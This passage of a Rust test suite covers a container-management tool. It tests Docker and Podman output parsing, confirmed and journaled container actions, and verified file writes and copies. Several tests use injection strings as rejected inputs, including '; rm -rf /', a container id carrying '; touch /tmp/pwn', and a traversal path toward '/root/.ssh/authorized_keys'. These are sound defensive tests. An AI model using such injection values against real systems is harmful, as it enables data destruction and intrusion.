                    action: ContainerAction::Stop,
                },
            )
            .await
            .unwrap();
        harness.set_execute_outputs([format!("{CONTAINER_A}\texited")]);
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let error = services
            .docker()
            .execute_action(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap_err();
        assert!(
            error
                .to_string()
                .contains("state changed from running to exited")
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());
    }

    #[tokio::test]
    async fn reversible_action_journals_failed_verification_before_restoring_prior_state() {
        let (_root, services, harness, session) = terminal_test_services().await;
        harness.set_execute_outputs([format!("{CONTAINER_A}\trunning")]);
        let plan = services
            .docker()
            .plan_action(
                &session,
                &ContainerActionRequest {
                    container: ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A)
                        .unwrap(),
                    action: ContainerAction::Pause,
                },
            )
            .await
            .unwrap();
        harness.set_execute_outputs([
            format!("{CONTAINER_A}\trunning"),
            "pause dispatched".to_owned(),
            "running".to_owned(),
            "unpause dispatched".to_owned(),
            format!("{CONTAINER_A}\trunning"),
        ]);
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .docker()
            .execute_action(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert!(!outcome.verified);
        assert!(outcome.restored_after_failed_verification);
        assert!(outcome.verification_detail.contains("running"));
        let phases = services
            .operation_journal()
            .entries()
            .unwrap()
            .into_iter()
            .map(|entry| entry.phase)
            .collect::<Vec<_>>();
        assert_eq!(
            phases,
            vec![
                crate::operations::JournalPhase::Executed,
                crate::operations::JournalPhase::VerificationFailed,
                crate::operations::JournalPhase::Restored,
            ]
        );
    }

    /// Podman prints the same command's output in a different shape.
    ///
    /// The row below is what `podman ps -a --no-trunc --format '{{json .}}'`
    /// actually returned on the lab host, trimmed to the fields the parser
    /// reads. Five of them differ from Docker: `Id` not `ID`, `Names` as a
    /// list, `Status` empty with the state in `State`, `CreatedAt` empty with
    /// the time in `Created`, and `Ports` as structured entries. Reading only
    /// Docker's names made every Podman host answer "no containers" — the
    /// worst kind of wrong answer, because it looks like an answer.
    #[test]
    fn the_container_list_reads_podman_rows_as_well_as_docker_rows() {
        let podman = serde_json::json!({
            "Id": CONTAINER_A,
            "Names": ["app-frontend"],
            "Image": "localhost/alpine:3.20",
            "State": "running",
            "Status": "",
            "Created": "2026-08-27T02:07:37.860716641Z",
            "CreatedAt": "",
            "Ports": [{
                "host_ip": "127.0.0.1",
                "host_port": 8080u64,
                "container_port": 80u64,
                "protocol": "tcp"
            }],
            "Command": ["sh", "-c", "sleep infinity"]
        })
        .to_string();
        let parsed = parse_container_list(ContainerRuntime::Podman, &podman).unwrap();
        let row = &parsed.items[0];
        assert_eq!(row.identity.id(), CONTAINER_A);
        assert_eq!(row.identity.runtime(), ContainerRuntime::Podman);
        assert_eq!(row.name, "app-frontend");
        assert_eq!(row.image, "localhost/alpine:3.20");
        assert_eq!(row.state, "running");
        // An empty status column would read as "unknown", not "running".
        assert_eq!(row.status, "running");
        assert_eq!(row.created_at, "2026-08-27T02:07:37.860716641Z");
        // Rendered the way the operator reads it elsewhere, not as raw JSON.
        assert_eq!(row.ports, "127.0.0.1:8080->80/tcp");
        assert_eq!(row.command, "sh -c sleep infinity");

        // Docker's shape still reads exactly as before.
        let docker = serde_json::json!({
            "ID": CONTAINER_B,
            "Names": "/api",
            "Image": "api:1",
            "State": "exited",
            "Status": "Exited (0) 2 minutes ago",
            "CreatedAt": "2026-08-27 01:00:00 +0000 UTC",
            "Ports": "0.0.0.0:9090->9090/tcp",
            "Command": "\"/entrypoint.sh\""
        })
        .to_string();
        let parsed = parse_container_list(ContainerRuntime::Docker, &docker).unwrap();
        let row = &parsed.items[0];
        assert_eq!(row.identity.id(), CONTAINER_B);
        assert_eq!(row.name, "api");
        assert_eq!(row.status, "Exited (0) 2 minutes ago");
        assert_eq!(row.created_at, "2026-08-27 01:00:00 +0000 UTC");
        assert_eq!(row.ports, "0.0.0.0:9090->9090/tcp");

        // A row with neither id key is still refused: an unnamed container is
        // one no later command could act on.
        let anonymous = serde_json::json!({"Names": ["ghost"]}).to_string();
        assert!(parse_container_list(ContainerRuntime::Podman, &anonymous).is_err());
    }

    /// A runtime's own diagnostics must not cost the operator the listing.
    ///
    /// stderr is folded into the same stream, and Podman greets every command
    /// on a cgroups-v1 host with a deprecation warning. One such line used to
    /// make the entire list fail to parse — the host looked broken because the
    /// runtime had been chatty.
    #[test]
    fn runtime_warnings_do_not_cost_the_listing_but_corrupt_rows_still_do() {
        let real_warning = concat!(
            "time=\"2026-08-27T02:07:38Z\" level=warning ",
            "msg=\"Using cgroups-v1 which is deprecated in favor of cgroups-v2\"\n"
        );
        let row = serde_json::json!({
            "Id": CONTAINER_A,
            "Names": ["app-frontend"],
            "State": "running"
        })
        .to_string();

        for output in [
            format!("{real_warning}{row}\n"),
            format!("{row}\n{real_warning}"),
            format!("WARNING: bridge-nf-call-iptables is disabled\n{row}\n"),
        ] {
            let parsed = parse_container_list(ContainerRuntime::Podman, &output).unwrap();
            assert_eq!(parsed.items.len(), 1, "warning swallowed the listing");
            assert_eq!(parsed.items[0].name, "app-frontend");
        }

        // A line that starts as an object and will not parse is a truncated
        // row, not chatter. Dropping it would quietly shorten the list.
        let truncated = format!("{row}\n{{\"Id\": \"cut-off");
        assert!(parse_container_list(ContainerRuntime::Podman, &truncated).is_err());
    }

    /// Which runtime a host has decides every command after it, so the probe
    /// reads what the host said and never fills a gap with a guess.
    #[test]
    fn the_runtime_probe_reads_what_is_there_and_invents_nothing() {
        // Nothing installed. "No container runtime" and "Docker with a
        // stopped daemon" have to stay different answers.
        let empty = parse_runtime_probe("");
        assert_eq!(empty.usable, None);
        assert!(empty.installed.is_empty());

        let stopped = parse_runtime_probe("docker\tinstalled\n");
        assert_eq!(stopped.usable, None);
        assert_eq!(stopped.installed, vec![ContainerRuntime::Docker]);

        // The common domestic-distro shape: Podman and no Docker at all.
        let podman = parse_runtime_probe("podman\tusable\n");
        assert_eq!(podman.usable, Some(ContainerRuntime::Podman));
        assert_eq!(podman.installed, vec![ContainerRuntime::Podman]);

        // Both answering: Docker wins, because a host with both keeps its
        // workloads there.
        let both = parse_runtime_probe("docker\tusable\npodman\tusable\n");
        assert_eq!(both.usable, Some(ContainerRuntime::Docker));
        assert_eq!(
            both.installed,
            vec![ContainerRuntime::Docker, ContainerRuntime::Podman]
        );

        // Docker present but dead, Podman alive: the one that answers is used.
        let mixed = parse_runtime_probe("docker\tinstalled\npodman\tusable\n");
        assert_eq!(mixed.usable, Some(ContainerRuntime::Podman));

        // A hostile or unexpected name must not become a runtime. This value
        // chooses which binary later commands run.
        let hostile = parse_runtime_probe("dockerx\tusable\n; rm -rf /\tusable\npodman\tusable\n");
        assert_eq!(hostile.usable, Some(ContainerRuntime::Podman));
        assert_eq!(hostile.installed, vec![ContainerRuntime::Podman]);
    }

    /// The state probe's separator has to be one the runtime actually emits.
    ///
    /// A bare `\t` inside `--format` reaches a Go template, which prints it as
    /// a backslash and a `t`. The parser splits on a real tab, so the probe
    /// returned "invalid state record" for every container that exists, and
    /// no action could be planned at all. Every unit test around it fed the
    /// parser a synthetic string that already had a real tab, so none noticed.
    #[test]
    fn the_state_probe_asks_for_a_separator_the_runtime_will_really_print() {
        let container = ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A).unwrap();
        let command = format!(
            "{} inspect --format '{{{{.Id}}}}{{{{\"\\t\"}}}}{{{{.State.Status}}}}' -- {}",
            container.runtime.command(),
            shq(container.id())
        );
        // Go prints a quoted escape; it passes an unquoted one straight
        // through. Only the first produces the byte the parser looks for.
        assert!(command.contains(r#"{{"\t"}}"#));
        assert!(!command.contains(r#"}}\t{{"#));
        assert_eq!(
            parse_state_probe(&container, &format!("{CONTAINER_A}\trunning")).unwrap(),
            "running"
        );
        // What the runtime prints when the escape is left unquoted.
        assert!(parse_state_probe(&container, &format!("{CONTAINER_A}\\trunning")).is_err());
    }

    /// The shell probe has to survive the two things that actually reach it:
    /// a runtime warning printed ahead of the answer, and an image that has no
    /// shell at all.
    #[test]
    fn the_shell_probe_prefers_bash_tolerates_noise_and_admits_when_there_is_none() {
        assert_eq!(parse_shell_probe("bash\n").unwrap(), ContainerShell::Bash);
        assert_eq!(parse_shell_probe("ash\n").unwrap(), ContainerShell::Ash);
        assert_eq!(parse_shell_probe("sh\n").unwrap(), ContainerShell::Sh);
        // Podman on a cgroups-v1 host prints this in front of every command.
        assert_eq!(
            parse_shell_probe("time=\"...\" level=warning msg=\"Using cgroups-v1\"\nbash\n")
                .unwrap(),
            ContainerShell::Bash,
        );
        // A distroless or scratch image: the exec produced nothing.
        assert!(parse_shell_probe("").is_err());
        assert!(parse_shell_probe("some unrelated warning\n").is_err());
        // The loop asks in preference order, so the first hit is the best one
        // available rather than whichever the image happens to list first.
        assert!(SHELL_PROBE_SCRIPT.contains("for lr_sh in bash ash sh"));
    }

    #[test]
    fn operation_commands_use_only_canonical_id_not_remote_row_text() {
        let (_root, services) = test_services();
        let guard = services
            .activate_target(TargetIdentity::new("host-a").unwrap())
            .unwrap();
        let action = build_action_plan(
            guard,
            &ContainerActionRequest {
                container: ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A).unwrap(),
                action: ContainerAction::Pause,
            },
            "running",
        )
        .unwrap();
        assert!(action.execute_command.contains(CONTAINER_A));
        assert!(!action.execute_command.contains("name"));
        assert!(
            action
                .restore_command
                .as_deref()
                .unwrap()
                .contains(CONTAINER_A)
        );

        let non_reversible_start = build_action_plan(
            services.target().current_guard().unwrap(),
            &ContainerActionRequest {
                container: ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_B).unwrap(),
                action: ContainerAction::Start,
            },
            "created",
        )
        .unwrap();
        assert!(non_reversible_start.restore_command.is_none());
        assert!(
            non_reversible_start
                .definition()
                .restore_description
                .is_none()
        );
    }

    #[test]
    fn action_catalog_and_ui_availability_share_the_planner_state_machine() {
        use std::collections::BTreeSet;

        let labels = ContainerAction::ALL
            .into_iter()
            .map(ContainerAction::label)
            .collect::<BTreeSet<_>>();
        assert_eq!(labels.len(), ContainerAction::ALL.len());

        let available = |state: &str| {
            ContainerAction::ALL
                .into_iter()
                .filter(|action| action.is_available_in_state(state))
                .collect::<Vec<_>>()
        };
        assert_eq!(
            available("created"),
            vec![ContainerAction::Start, ContainerAction::Remove]
        );
        assert_eq!(
            available("running"),
            vec![
                ContainerAction::Stop,
                ContainerAction::Restart,
                ContainerAction::Pause,
                ContainerAction::Kill,
            ]
        );
        assert_eq!(
            available("paused"),
            vec![
                ContainerAction::Stop,
                ContainerAction::Restart,
                ContainerAction::Unpause,
                ContainerAction::Kill,
            ]
        );
        assert_eq!(
            available("restarting"),
            vec![ContainerAction::Stop, ContainerAction::Kill]
        );
        assert_eq!(
            available("exited"),
            vec![ContainerAction::Start, ContainerAction::Remove]
        );
        assert_eq!(
            available("dead"),
            vec![ContainerAction::Start, ContainerAction::Remove]
        );
        assert_eq!(available("removing"), vec![ContainerAction::Remove]);
        assert!(available("attacker-controlled").is_empty());
    }

    #[test]
    fn container_file_paths_are_strict_absolute_posix_paths() {
        assert!(ContainerFilePath::new("/etc/nginx/nginx.conf").is_ok());
        assert!(ContainerFilePath::new("etc/passwd").is_err());
        assert!(ContainerFilePath::new("/etc/../root/.ssh/authorized_keys").is_err());
        assert!(ContainerFilePath::new("/tmp/a\nmalicious").is_err());
        assert!(ContainerFilePath::new("/tmp//ambiguous").is_err());
        assert!(ContainerFilePath::new("/").is_err());
    }

    #[tokio::test]
    async fn file_read_mints_exact_redacted_snapshot_and_edit_rejects_a_concurrent_change() {
        let (_root, services, harness, session) = terminal_test_services().await;
        let original = "token=remote-secret\nworkers=4\n";
        let original_marker = format!(
            "file\t{}\t{}",
            sha256_hex(original.as_bytes()),
            original.len()
        );
        harness.set_execute_outputs([
            original_marker.clone(),
            original.to_owned(),
            original_marker,
        ]);
        let container = ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A).unwrap();
        let path = ContainerFilePath::new("/etc/app.conf").unwrap();
        let loaded = services
            .docker()
            .read_file(&session, &container, &path)
            .await
            .unwrap();
        assert_eq!(loaded.container(), &container);
        assert_eq!(loaded.path(), &path);
        assert_eq!(loaded.content(), original);
        assert_eq!(loaded.content_bytes(), original.len());
        assert_eq!(loaded.sha256(), sha256_hex(original.as_bytes()));
        let debug = format!("{loaded:?}");
        assert!(debug.contains("redacted"));
        assert!(!debug.contains("remote-secret"));

        let changed = "token=changed-remotely\nworkers=8\n";
        harness.set_execute_outputs([format!(
            "file\t{}\t{}",
            sha256_hex(changed.as_bytes()),
            changed.len()
        )]);
        let request = DockerFileWriteRequest::replace(&loaded, "workers=16\n").unwrap();
        assert!(!format!("{request:?}").contains("workers=16"));
        let error = services
            .docker()
            .plan_file_write(&session, request)
            .await
            .unwrap_err();
        assert!(error.to_string().contains("reload before saving"));
        assert!(services.operation_journal().entries().unwrap().is_empty());
    }

    #[tokio::test]
    async fn file_read_rejects_bytes_that_do_not_match_the_remote_marker() {
        let (_root, services, harness, session) = terminal_test_services().await;
        let expected = "trusted";
        harness.set_execute_outputs([
            format!(
                "file\t{}\t{}",
                sha256_hex(expected.as_bytes()),
                expected.len()
            ),
            "attacker-replaced-output".to_owned(),
        ]);
        let error = services
            .docker()
            .read_file(
                &session,
                &ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A).unwrap(),
                &ContainerFilePath::new("/etc/app.conf").unwrap(),
            )
            .await
            .unwrap_err();
        assert!(error.to_string().contains("does not match"));
    }

    #[test]
    fn file_copy_catalog_has_typed_domains_and_shell_quoted_commands() {
        use std::collections::BTreeSet;

        let ids = DockerFileCopyDirection::ALL
            .into_iter()
            .map(DockerFileCopyDirection::id)
            .collect::<BTreeSet<_>>();
        assert_eq!(ids.len(), DockerFileCopyDirection::ALL.len());
        let container = ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A).unwrap();
        let request = DockerFileCopyRequest::ContainerToHost {
            container: container.clone(),
            source: ContainerFilePath::new("/var/log/app 'quoted'.log").unwrap(),
            target: RemotePath::new("/tmp/copied 'quoted'.log").unwrap(),
        };
        let (_, direction, source, target) = copy_request_endpoints(request).unwrap();
        let plan = build_file_copy_plan(
            TargetGuard {
                identity: TargetIdentity::new("host-a").unwrap(),
                generation: 1,
            },
            container,
            direction,
            source,
            target,
            ContainerFileState::File {
                sha256: sha256_hex(b"source"),
                bytes: 6,
            },
            ContainerFileState::Missing,
        )
        .unwrap();
        let command = copy_to_temporary_command(&plan).unwrap();
        let temporary = plan.target_temporary.path();
        let expected_script = format!(
            "set -eu; [ ! -e {temporary} ] && [ ! -L {temporary} ]; docker cp {source} {temporary}",
            temporary = shq(temporary),
            source = shq(&format!("{}:{}", CONTAINER_A, "/var/log/app 'quoted'.log")),
        );
        assert_eq!(command, format!("sh -c {}", shq(&expected_script)));
        assert_eq!(plan.direction(), DockerFileCopyDirection::ContainerToHost);
        assert_eq!(plan.source_bytes(), 6);

        assert!(
            copy_request_endpoints(DockerFileCopyRequest::HostToContainer {
                container: plan.container().clone(),
                source: RemotePath::new("/tmp/ambiguous:name").unwrap(),
                target: ContainerFilePath::new("/tmp/target").unwrap(),
            })
            .unwrap_err()
            .to_string()
            .contains("colon")
        );
    }

    #[tokio::test]
    async fn file_copy_requires_exact_confirmation_then_journals_and_verifies() {
        let (_root, services, harness, session) = terminal_test_services().await;
        let source = "binary-safe-source";
        let source_marker = format!("file\t{}\t{}", sha256_hex(source.as_bytes()), source.len());
        harness.set_execute_outputs([
            source_marker.clone(),
            "missing".to_owned(),
            source_marker.clone(),
            "missing".to_owned(),
            "missing".to_owned(),
            "missing".to_owned(),
            String::new(),
            "installed".to_owned(),
            source_marker.clone(),
            source_marker,
        ]);
        let plan = services
            .docker()
            .plan_file_copy(
                &session,
                DockerFileCopyRequest::ContainerToHost {
                    container: ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A)
                        .unwrap(),
                    source: ContainerFilePath::new("/var/log/app.log").unwrap(),
                    target: RemotePath::new("/tmp/app.log").unwrap(),
                },
            )
            .await
            .unwrap();
        let unrelated =
            OperationPlan::new(session.target().clone(), "unrelated operation", true, None)
                .unwrap();
        assert!(
            services
                .docker()
                .execute_file_copy(
                    &session,
                    plan.clone(),
                    DangerousConfirmation::approve(&unrelated),
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());

        let outcome = services
            .docker()
            .execute_file_copy(
                &session,
                plan.clone(),
                DangerousConfirmation::approve(plan.definition()),
                services.operation_journal(),
            )
            .await
            .unwrap();
        assert!(outcome.verified);
        assert!(!outcome.restored_after_failed_verification);
        assert!(outcome.verification_detail.contains("SHA-256"));
        assert_eq!(services.operation_journal().entries().unwrap().len(), 2);
    }

    #[tokio::test]
    async fn file_copy_verification_failure_restores_only_its_own_written_revision() {
        let (_root, services, harness, session) = terminal_test_services().await;
        let source = "source-v1";
        let changed_source = "source-v2";
        let original_target = "target-v0";
        let marker =
            |value: &str| format!("file\t{}\t{}", sha256_hex(value.as_bytes()), value.len());
        harness.set_execute_outputs([
            marker(source),
            marker(original_target),
            marker(source),
            marker(original_target),
            "missing".to_owned(),
            "missing".to_owned(),
            String::new(),
            "installed".to_owned(),
            marker(changed_source),
            marker(source),
            marker(source),
            String::new(),
            marker(original_target),
        ]);
        let plan = services
            .docker()
            .plan_file_copy(
                &session,
                DockerFileCopyRequest::InContainer {
                    container: ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A)
                        .unwrap(),
                    source: ContainerFilePath::new("/opt/app/source.bin").unwrap(),
                    target: ContainerFilePath::new("/opt/app/target.bin").unwrap(),
                },
            )
            .await
            .unwrap();
        let outcome = services
            .docker()
            .execute_file_copy(
                &session,
                plan.clone(),
                DangerousConfirmation::approve(plan.definition()),
                services.operation_journal(),
            )
            .await
            .unwrap();
        assert!(!outcome.verified);
        assert!(outcome.restored_after_failed_verification);
        let phases = services
            .operation_journal()
            .entries()
            .unwrap()
            .into_iter()
            .map(|entry| entry.phase)
            .collect::<Vec<_>>();
        assert_eq!(
            phases,
            vec![
                crate::operations::JournalPhase::Executed,
                crate::operations::JournalPhase::VerificationFailed,
                crate::operations::JournalPhase::Restored,
            ]
        );
    }

    #[tokio::test]
    async fn file_copy_refuses_to_restore_over_an_independent_target_revision() {
        let (_root, services, harness, session) = terminal_test_services().await;
        let source = "source-v1";
        let original_target = "target-v0";
        let independent_target = "target-v2";
        let marker =
            |value: &str| format!("file\t{}\t{}", sha256_hex(value.as_bytes()), value.len());
        harness.set_execute_outputs([
            marker(source),
            marker(original_target),
            marker(source),
            marker(original_target),
            "missing".to_owned(),
            "missing".to_owned(),
            String::new(),
            "installed".to_owned(),
            marker(source),
            marker(independent_target),
            marker(independent_target),
        ]);
        let plan = services
            .docker()
            .plan_file_copy(
                &session,
                DockerFileCopyRequest::InContainer {
                    container: ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A)
                        .unwrap(),
                    source: ContainerFilePath::new("/opt/app/source.bin").unwrap(),
                    target: ContainerFilePath::new("/opt/app/target.bin").unwrap(),
                },
            )
            .await
            .unwrap();
        let error = services
            .docker()
            .execute_file_copy(
                &session,
                plan.clone(),
                DangerousConfirmation::approve(plan.definition()),
                services.operation_journal(),
            )
            .await
            .unwrap_err();
        assert!(error.to_string().contains("will not be overwritten"));
        let phases = services
            .operation_journal()
            .entries()
            .unwrap()
            .into_iter()
            .map(|entry| entry.phase)
            .collect::<Vec<_>>();
        assert_eq!(
            phases,
            vec![
                crate::operations::JournalPhase::Executed,
                crate::operations::JournalPhase::VerificationFailed,
            ]
        );
    }

    #[tokio::test]
    async fn file_write_returns_verified_typed_restore_receipt_and_quotes_identity() {
        let (_root, services, harness, session) = terminal_test_services().await;
        harness.set_sftp_immediate(true);
        let original = "old-content";
        let original_marker = format!(
            "file\t{}\t{}",
            sha256_hex(original.as_bytes()),
            original.len()
        );
        harness.set_execute_outputs([
            original_marker.clone(),
            original_marker,
            String::new(),
            "installed\n".to_owned(),
            "hello".to_owned(),
        ]);
        let request = DockerFileWriteRequest::new(
            ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A).unwrap(),
            ContainerFilePath::new("/etc/app.conf").unwrap(),
            "hello",
        )
        .unwrap();
        assert!(!format!("{request:?}").contains("hello"));
        let plan = services
            .docker()
            .plan_file_write(&session, request)
            .await
            .unwrap();
        assert_eq!(plan.content_bytes(), 5);
        assert_eq!(plan.content_sha256(), sha256_hex(b"hello"));
        assert!(plan.backup_path().as_str().contains(".lovelyres.bak."));
        assert!(
            container_file_copy_command(plan.container(), &plan).contains(&format!(
                "'{}:{}'",
                CONTAINER_A,
                plan.container_temp_path.as_str()
            ))
        );

        let unrelated =
            OperationPlan::new(session.target().clone(), "unrelated operation", true, None)
                .unwrap();
        assert!(
            services
                .docker()
                .execute_file_write(
                    &session,
                    plan.clone(),
                    DangerousConfirmation::approve(&unrelated),
                    services.operation_journal(),
                )
                .await
                .is_err()
        );

        let outcome = services
            .docker()
            .execute_file_write(
                &session,
                plan.clone(),
                DangerousConfirmation::approve(plan.definition()),
                services.operation_journal(),
            )
            .await
            .unwrap();
        assert!(outcome.verified);
        assert!(!outcome.restored_after_failed_verification);
        let restore = outcome.restore_receipt.expect("typed restore receipt");
        assert_eq!(restore.target(), session.target());
        assert_eq!(restore.container(), plan.container());
        assert_eq!(restore.path(), plan.path());
        assert_eq!(restore.written_bytes(), 5);
        assert_eq!(restore.written_sha256(), sha256_hex(b"hello"));
        assert!(restore.had_original_file());
        assert!(
            restore
                .backup_path()
                .is_some_and(|path| path.as_str().contains(".lovelyres.bak."))
        );
        let entries = services.operation_journal().entries().unwrap();
        assert_eq!(entries.len(), 2);
        assert!(entries.iter().all(|entry| !entry.detail.contains("hello")));

        let forged: ContainerIdentity = serde_json::from_value(serde_json::json!({
            "runtime": "docker",
            "id": "web; touch /tmp/pwn"
        }))
        .unwrap();
        let forged_request = DockerFileWriteRequest::new(
            forged,
            ContainerFilePath::new("/etc/app.conf").unwrap(),
            "safe",
        )
        .unwrap();
        assert!(
            services
                .docker()
                .plan_file_write(&session, forged_request)
                .await
                .is_err()
        );
    }

    #[tokio::test]
    async fn file_write_mismatch_is_journaled_and_restores_missing_state() {
        let (_root, services, harness, session) = terminal_test_services().await;
        harness.set_sftp_immediate(true);
        harness.set_execute_outputs([
            "missing".to_owned(),
            "missing".to_owned(),
            String::new(),
            "installed\n".to_owned(),
            "wrong".to_owned(),
            format!("file\t{}\t5", sha256_hex(b"wrong")),
            String::new(),
            "missing".to_owned(),
        ]);
        let request = DockerFileWriteRequest::new(
            ContainerIdentity::new(ContainerRuntime::Podman, CONTAINER_A).unwrap(),
            ContainerFilePath::new("/etc/new.conf").unwrap(),
            "right",
        )
        .unwrap();
        let plan = services
            .docker()
            .plan_file_write(&session, request)
            .await
            .unwrap();
        let outcome = services
            .docker()
            .execute_file_write(
                &session,
                plan.clone(),
                DangerousConfirmation::approve(plan.definition()),
                services.operation_journal(),
            )
            .await
            .unwrap();
        assert!(!outcome.verified);
        assert!(outcome.restored_after_failed_verification);
        assert!(outcome.restore_receipt.is_none());
        let phases = services
            .operation_journal()
            .entries()
            .unwrap()
            .into_iter()
            .map(|entry| entry.phase)
            .collect::<Vec<_>>();
        assert_eq!(
            phases,
            vec![
                crate::operations::JournalPhase::Executed,
                crate::operations::JournalPhase::VerificationFailed,
                crate::operations::JournalPhase::Restored,
            ]
        );
    }
}
